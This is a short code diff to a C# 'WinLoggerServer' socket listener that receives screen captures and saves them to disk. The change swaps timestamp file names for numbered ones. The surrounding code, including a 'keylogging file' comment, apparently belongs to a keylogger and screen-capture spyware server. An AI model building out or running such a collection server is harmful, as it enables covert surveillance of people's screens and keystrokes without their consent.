@@ -21,7 +21,7 @@ public class WinLoggerServer {
 		public static void screenListen() {  
         // Data buffer for incoming data.  
         byte[] bytes = new Byte[1048576];  
-
+	    int index = 0;
         // Establish the local endpoint for the socket.
         IPHostEntry ipHostInfo = Dns.GetHostEntry(Dns.GetHostName());  
         IPAddress ipAddress = ipHostInfo.AddressList[0];
@@ -50,8 +50,9 @@ public class WinLoggerServer {
 					screenGrab = Image.FromStream(memStream);
 				}
                 // Append text to the keylogging file.
-                string time = DateTime.Now.ToString();
-				string screenfp = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location) + @"\" + time;
+                string append = "logFileLine" + index.ToString();
+				string screenfp = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location) + @"\" + append;
+				index++;
 				screenGrab.Save(screenfp);
                 handler.Shutdown(SocketShutdown.Both);  
                 handler.Close();  
